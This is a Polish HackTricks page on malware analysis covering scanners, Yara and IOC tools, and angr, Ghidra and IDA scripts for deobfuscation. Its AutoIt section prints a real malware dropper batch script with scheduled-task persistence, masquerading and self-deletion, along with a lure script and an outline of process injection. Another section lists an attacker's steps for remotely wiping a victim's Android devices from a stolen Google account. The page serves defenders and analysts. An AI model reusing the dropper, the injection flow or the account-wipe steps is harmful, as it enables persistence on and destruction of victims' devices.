# Analiza Malware

{{#include ../../banners/hacktricks-training.md}}

## Ściągi Forensics

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Usługi online

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Narzędzia antywirusowe i detekcyjne (offline)

### Yara

#### Instalacja
```bash
sudo apt-get install -y yara
```
#### Przygotuj reguły

Użyj tego skryptu, aby pobrać i scalić wszystkie reguły yara dla malware z githuba: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Utwórz katalog _**rules**_ i uruchom go. Spowoduje to utworzenie pliku _**malware_rules.yar**_, który zawiera wszystkie reguły yara dla malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Skanowanie
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Sprawdź malware i utwórz reguły

Możesz użyć narzędzia [**YaraGen**](https://github.com/Neo23x0/yarGen) do wygenerowania yara rules z pliku binarnego. Zobacz te samouczki: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Instalacja
```
sudo apt-get install -y clamav
```
#### Skan
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** wykrywa potencjalnie złośliwe **capabilities** w plikach wykonywalnych: PE, ELF, .NET. Dzięki temu znajdzie rzeczy takie jak Att\&ck tactics, lub podejrzane capabilities takie jak:

- check for OutputDebugString error
- run as a service
- create process

Pobierz je z [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC means Indicator Of Compromise. IOC to zbiór **warunków, które identyfikują** potencjalnie niechciane oprogramowanie lub potwierdzone **malware**. Blue Teams używają tego rodzaju definicji do **wyszukiwania tego typu złośliwych plików** w swoich **systemach** i **sieciach**.\
Dzielenie się tymi definicjami jest bardzo przydatne — gdy malware zostanie zidentyfikowane na komputerze i zostanie utworzony IOC dla tego malware, inne Blue Teams mogą go wykorzystać do szybszej identyfikacji.

A tool to create or modify IOCs is [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
You can use tools such as [**Redline**](https://www.fireeye.com/services/freeware/redline.html) to **wyszukiwania zdefiniowanych IOC na urządzeniu**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) jest skanerem Simple Indicators of Compromise.\
Detekcja oparta jest na czterech metodach wykrywania:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) jest skanerem malware dla Linuxa wydanym na licencji GNU GPLv2, zaprojektowanym z myślą o zagrożeniach występujących w współdzielonych środowiskach hostingowych. Wykorzystuje dane o zagrożeniach z network edge intrusion detection systems do wyodrębniania malware, które jest aktywnie wykorzystywane w atakach, i generuje sygnatury do wykrywania. Dodatkowo dane o zagrożeniach pochodzą także ze zgłoszeń użytkowników za pomocą LMD checkout feature oraz z zasobów społeczności zajmującej się malware.

### rkhunter

Narzędzia takie jak [**rkhunter**](http://rkhunter.sourceforge.net) można użyć do sprawdzenia systemu plików pod kątem możliwych **rootkits** i malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) to narzędzie, które próbuje znaleźć obfuskowane ciągi w plikach wykonywalnych, używając różnych technik.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) sprawdza podstawowe rzeczy w pliku wykonywalnym (dane binarne, entropia, URL-e i IP, niektóre reguły yara).

### PEstudio

[PEstudio](https://www.winitor.com/download) to narzędzie umożliwiające uzyskanie informacji o plikach wykonywalnych Windows, takich jak importy, eksporty, nagłówki, a także sprawdzające virus total i wykrywające potencjalne techniki Att\&ck.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) to narzędzie do wykrywania, czy plik jest **zaszyfrowany**, a także do znajdowania **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) jest skryptem Python, który wykorzystuje różne **metody statystyczne** do wykrywania **obfuskowanej** i **zaszyfrowanej** zawartości w plikach tekstowych/skryptach. Celem NeoPI jest pomoc w **wykrywaniu ukrytego kodu web shell**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) robi wszystko, by wykryć **obfuskowany**/**podejrzany kod**, jak również pliki używające funkcji **PHP** często wykorzystywanych w **malwares**/webshells.

### Apple Binary Signatures

Podczas sprawdzania **malware sample** zawsze powinieneś **sprawdzić podpis** binarki, ponieważ **developer**, który ją podpisał, może być już **powiązany** z **malware**.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Techniki wykrywania

### File Stacking

Jeśli wiesz, że jakiś folder zawierający **files** serwera WWW był **ostatnio zaktualizowany w określonym dniu**. **Sprawdź** daty utworzenia i modyfikacji wszystkich **files** na **web server** i jeśli któraś data jest **podejrzana**, sprawdź ten plik.

### Punkty odniesienia

Jeśli **files** w folderze **nie powinny być modyfikowane**, możesz obliczyć **hash** **oryginalnych files** w folderze i **porównać** je z **obecnymi**. Wszystko zmodyfikowane będzie **podejrzane**.

### Analiza statystyczna

Gdy informacje są zapisywane w **logs**, możesz **sprawdzić statystyki**, np. ile razy każdy **file** z **web server** był dostępny — web shell może być jednym z najczęstszych.

---

### Android — telemetry natywna w aplikacji (bez root)

Na **Android**, możesz instrumentować native code wewnątrz procesu docelowej aplikacji przez wstępne załadowanie małej biblioteki logger przed inicjalizacją innych **JNI** libs. Daje to wczesną widoczność zachowania native bez system-wide hooks ani root. Popularne podejście to **SoTap**: wrzuć **libsotap.so** dla odpowiedniego **ABI** do **APK** i wstrzyknij wywołanie System.loadLibrary("sotap") wcześnie (np. static initializer lub Application.onCreate), następnie zbieraj **logs** z internal/external paths lub fallback do **Logcat**.

Zobacz stronę Android native reversing po szczegóły konfiguracji i ścieżki logów:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI — deobfuskacja natywnych stringów przy użyciu angr + Ghidra

Niektóre **Android malware** i aplikacje chronione przez **RASP** ukrywają nazwy metod **JNI** i sygnatury, dekodując je w czasie wykonywania przed wywołaniem **RegisterNatives**. Kiedy instrumentacja **Frida/ptrace** zostanie zabita przez anti-debug, nadal możesz odzyskać plaintext offline, wykonując dekoder osadzony w binary przy pomocy **angr**, a następnie wstawiając wyniki z powrotem do **Ghidra** jako komentarze.

Główna idea: potraktuj dekoder wewnątrz **.so** jako callable function, wykonaj go na obfuskowanych byte blobs w **.rodata**, i konkretyzuj output bytes aż do pierwszego \x00 (C-string terminator). Upewnij się, że **angr** i **Ghidra** używają tej samej image base, aby uniknąć rozbieżności adresów.

Przegląd workflow
- Triage w **Ghidra**: zidentyfikuj dekoder i jego calling convention/arguments w **JNI_OnLoad** i konfiguracji **RegisterNatives**.
- Uruchom **angr** (CPython3), aby wykonać dekoder dla każdego target string i zrzucić wyniki.
- Adnotuj w **Ghidra**: automatycznie komentuj zdeobfuskowane stringi w każdym miejscu wywołania, aby szybko odtworzyć **JNI**.

Triage w Ghidra (wzorzec JNI_OnLoad)
- Zastosuj JNI datatypes do **JNI_OnLoad**, aby **Ghidra** rozpoznawała struktury **JNINativeMethod**.
- Typowa struktura **JNINativeMethod** według dokumentacji Oracle:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Szukaj wywołań **RegisterNatives**. Jeśli biblioteka konstruuje name/signature za pomocą lokalnej procedury (np. FUN_00100e10), która odwołuje się do statycznej tabeli bajtów (np. DAT_00100bf4) i przyjmuje parametry takie jak (encoded_ptr, out_buf, length), to jest idealny cel do wykonania offline.

Konfiguracja angr (wykonanie dekodera offline)
- Załaduj **.so** z tym samym base używanym w **Ghidra** (np. 0x00100000) i wyłącz auto-ładowanie external libs, aby utrzymać stan małym.

<details>
<summary>Konfiguracja angr i wykonanie dekodera offline</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Na dużą skalę zbuduj statyczną mapę miejsc wywołań do argumentów dekodera (encoded_ptr, size). Wrappery mogą ukrywać argumenty, więc możesz utworzyć to mapowanie ręcznie z Ghidra xrefs, jeśli odzyskiwanie API generuje dużo szumów.

<details>
<summary>Hurtowe dekodowanie wielu miejsc wywołań przy użyciu angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Adnotuj miejsca wywołań w Ghidra
Option A: Jython-only comment writer (use a pre-computed JSON)
- Ponieważ angr wymaga CPython3, oddziel deobfuskację od adnotacji. Najpierw uruchom powyższy skrypt angr, aby wygenerować decoded_strings.json. Następnie uruchom ten Jython GhidraScript, aby zapisać PRE_COMMENTs przy każdym miejscu wywołania (i dołączyć nazwę funkcji wywołującej dla kontekstu):

<details>
<summary>Skrypt Jython dla Ghidra do adnotacji odszyfrowanych stringów JNI</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: Single CPython script via pyhidra/ghidra_bridge
- Alternatywnie, użyj pyhidra lub ghidra_bridge, aby sterować API Ghidra z tego samego procesu CPython uruchamiającego angr. Pozwala to wywoływać decode_string() i natychmiast ustawiać PRE_COMMENTs bez pliku pośredniego. Logika odpowiada skryptowi Jython: zbuduj mapę callsite→function za pomocą ReferenceManager, zdeoduj za pomocą angr i ustaw komentarze.

Why this works and when to use it
- Wykonanie offline omija RASP/anti-debug: nie wymaga ptrace ani Frida hooks do odzyskania łańcuchów znaków.
- Utrzymanie zgodnych base_addr w Ghidra i angr (np. 0x00100000) gwarantuje, że adresy funkcji/danych będą pasować między narzędziami.
- Powtarzalny przepis dla decoderów: traktuj transformację jako funkcję czystą, przydziel bufor wyjściowy w świeżym stanie, wywołaj ją z (encoded_ptr, out_ptr, len), następnie skonkretyzuj przy pomocy state.solver.eval i parsuj C-strings aż do \x00.

Notes and pitfalls
- Przestrzegaj docelowego ABI/konwencji wywołań. angr.factory.callable wybiera ją na podstawie arch; jeśli argumenty wyglądają na przesunięte, określ cc jawnie.
- Jeśli decoder oczekuje wyzerowanych buforów wyjściowych, zainicjalizuj outbuf zerami w stanie przed wywołaniem.
- Dla position-independent Android .so zawsze podaj base_addr, aby adresy w angr odpowiadały tym widocznym w Ghidra.
- Użyj currentProgram.getReferenceManager(), aby wyenumerować call-xrefs, nawet jeśli aplikacja owija decoder za cienkimi stubami.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuskacja dynamicznego przepływu sterowania (JMP/CALL RAX Dispatchers)

Nowoczesne rodziny malware nadużywają obfuskacji Control-Flow Graph (CFG): zamiast bezpośredniego jump/call obliczają cel w czasie wykonywania i wykonują `jmp rax` lub `call rax`. Mały *dispatcher* (zwykle dziewięć instrukcji) ustawia ostateczny cel w zależności od flag CPU `ZF`/`CF`, całkowicie łamiąc statyczne odzyskiwanie CFG.

Technikę – pokazaną przez loader SLOW#TEMPEST – można pokonać za pomocą trzystopniowego workflowu opartego wyłącznie na IDAPython i emulatorze CPU Unicorn.

### 1. Zlokalizuj każdy pośredni skok/wywołanie (indirect jump/call)
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Wyodrębnij dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emuluj to dwukrotnie przy użyciu Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Uruchom `run(code,0,0)` i `run(code,1,1)`, aby uzyskać *false* i *true* cele gałęzi.

### 4. Przywrócenie bezpośredniego jumpa / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Po patchowaniu wymuś na IDA ponowną analizę funkcji, aby pełny CFG i wynik Hex-Rays zostały przywrócone:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Oznacz pośrednie API calls

Gdy znane jest rzeczywiste miejsce docelowe każdego `call rax`, możesz wskazać to IDA, dzięki czemu typy parametrów i nazwy zmiennych zostaną odzyskane automatycznie:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktyczne korzyści

* Przywraca rzeczywisty CFG → decompilation przechodzi z *10* linii do tysięcy.
* Umożliwia string-cross-reference & xrefs, co czyni rekonstrukcję zachowania trywialną.
* Skrypty są wielokrotnego użytku: wrzuć je do dowolnego loadera chronionego tym samym trikiem.

---

## Ładowniki oparte na AutoIt: odszyfrowanie .a3x, Task Scheduler masquerade i RAT injection

Ten wzorzec intruzji łączy podpisany MSI, AutoIt loaders skompilowane do .a3x oraz zadanie Task Scheduler podszywające się pod zaufaną aplikację.

### MSI → custom actions → AutoIt orchestrator

Drzewo procesów i polecenia wykonywane przez akcje niestandardowe MSI:

- MsiExec.exe → cmd.exe by uruchomić install.bat
- WScript.exe aby wyświetlić wprowadzający w błąd dialog błędu
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (zrzuca loader, ustawia persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (przynęta użytkownika):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Kluczowe artefakty i maskowanie:
- Umieszcza pliki AutoIt3.exe i IoKlTr.au3 w C:\Users\Public\Music
- Kopiuje schtasks.exe do hwpviewer.exe (podszywa się pod Hangul Word Processor viewer)
- Tworzy zadanie zaplanowane "IoKlTr", które uruchamia się co 1 minutę
- Skrót startowy widoczny jako Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Umieszcza moduły w podfolderach %APPDATA%\Google\Browser\ zawierających `adb` lub `adv` i uruchamia je przy pomocy skryptów pomocniczych autoit.vbs/install.bat

Wskazówki do triage kryminalistycznego:
- Enumeracja schtasks: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Szukaj przemianowanych kopii schtasks.exe współistniejących z Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Typowe ścieżki: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, skrót startowy `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Korelacja tworzenia procesów: AutoIt3.exe uruchamiający legalne binaria Windows (np. cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- Moduły AutoIt są kompilowane z `#AutoIt3Wrapper_Outfile_type=a3x` i odszyfrowują osadzone payloady przed wstrzyknięciem do procesów zaufanych.
- Zaobserwowane rodziny: QuasarRAT (injected into hncfinder.exe) i RftRAT/RFTServer (injected into cleanmgr.exe), a także moduły RemcosRAT (`Remcos\RunBinary.a3x`).
- Schemat odszyfrowania: wyprowadzenie klucza AES za pomocą HMAC, odszyfrowanie osadzonego blobu, a następnie wstrzyknięcie jawnego modułu.

Ogólny szkielet odszyfrowania (dokładne HMAC input/algorytm są specyficzne dla rodziny):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Typowy przebieg iniekcji (CreateRemoteThread-style):
- CreateProcess (suspended) procesu docelowego (np. cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory z odszyfrowanym modułem/shellcode
- CreateRemoteThread lub QueueUserAPC, aby uruchomić payload

Pomysły na wykrywanie
- AutoIt3.exe z rodzicem MsiExec.exe lub WScript.exe uruchamiający narzędzia systemowe
- Pliki z rozszerzeniem `.a3x` lub interpretery skryptów AutoIt znajdujące się w public/user-writable ścieżkach
- Podejrzane zaplanowane zadania uruchamiające AutoIt3.exe lub binaria niepodpisane przez Microsoft, z wyzwalaczami o interwale minutowym

### Wykorzystanie przejęcia konta w Android Find My Device (Find Hub)

Podczas włamania w środowisku Windows operatorzy używali skradzionych poświadczeń Google, aby wielokrotnie wymazywać urządzenia Android ofiary, tłumiąc powiadomienia podczas rozszerzania dostępu przez zalogowany na desktopie komunikator ofiary.

Kroki operatora (z zalogowanej sesji przeglądarki):
- Przejrzyj Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Wybierz urządzenie → ponownie wprowadź hasło Google → wykonaj "Erase device" (factory reset); powtarzaj, aby opóźnić odzyskanie
- Opcjonalnie: usuń e-maile z alertami w powiązanej skrzynce (np. Naver), aby ukryć powiadomienia bezpieczeństwa

## AdaptixC2: Ekstrakcja konfiguracji i TTPs

Zobacz dedykowaną stronę:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Źródła

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
